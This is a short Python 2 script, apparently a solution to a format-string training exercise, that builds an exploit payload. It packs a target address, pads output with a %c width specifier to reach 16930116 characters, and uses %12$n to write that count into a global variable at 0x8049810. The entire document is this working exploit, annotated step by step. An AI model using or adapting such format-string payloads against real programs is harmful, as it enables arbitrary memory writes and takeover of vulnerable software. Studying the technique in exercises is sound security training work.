#!/usr/bin/env python2

import struct
import sys

# Target: Write 16930116 (0x1025544) to global variable at 0x8049810
target_addr = 0x8049810
target_value = 16930116  # 0x1025544

# Our input appears at position 12 on the stack
# So we use %12$n to write to the address at position 12

# Method: Use width specifier to print exact number of characters
# Format: %[width]c prints a character padded to [width] characters

payload = struct.pack("<L", target_addr)  # 4 bytes: target address (0x8049810)

# We need to print exactly target_value characters total
# We already have 4 characters from the address
remaining = target_value - 4  # 16930112 characters needed

payload += "%" + str(remaining) + "c"  # Print 16930112 characters (padded)
payload += "%12$n"                     # Write the count to address at stack position 12

print payload